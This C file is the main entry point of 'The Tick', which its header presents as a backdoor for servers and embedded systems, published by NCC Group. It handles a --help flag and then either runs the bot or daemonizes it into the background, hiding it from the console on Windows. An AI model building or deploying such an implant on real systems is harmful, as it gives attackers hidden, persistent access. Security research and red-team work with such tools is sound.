/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include "main.h"

#include "command.h"

#if TICK_CONFIG_USE_ARGV
int main(int argc, char *argv[])
#else
int main(void)
#endif
{
    // If there is a --help switch, show the help and quit.
#if TICK_VERBOSE
# if TICK_CONFIG_USE_ARGV
    if (argc > 1) {
        int x;
        for (x = 1; x < argc; x++) {
            if (strcmp(argv[x], "--help") == 0) {
                show_help(NULL, argv[0]);
                return 0;
            }
        }
    }
# endif
# if TICK_CONFIG_USE_ENV
    char *env = getenv(QUOTE(TICK_CONFIG_ENV_NAME));
    if (env != NULL) {
        env = strstr(env, "--help");
        if (env != NULL) {
            show_help(NULL, argv[0]);
            return 0;
        }
    }
# endif
#endif

    // If not on Windows and logging is enabled, run the bot directly.
    // Otherwise, daemonize the bot (run in background).
    // Daemonizing is not needed on Windows since we took care of that
    // already during the linking phase, by marking the executable as
    // having a GUI, which causes Windows to detach it from the console.
#if TICK_VERBOSE || defined (_WIN32)
# if TICK_CONFIG_USE_ARGV
    return run(argc, argv);
# else
    return run(0, NULL);
# endif
#else
# if TICK_CONFIG_USE_ARGV
    return daemonize(argc, argv);
# else
    return daemonize(0, NULL);
# endif
#endif
}
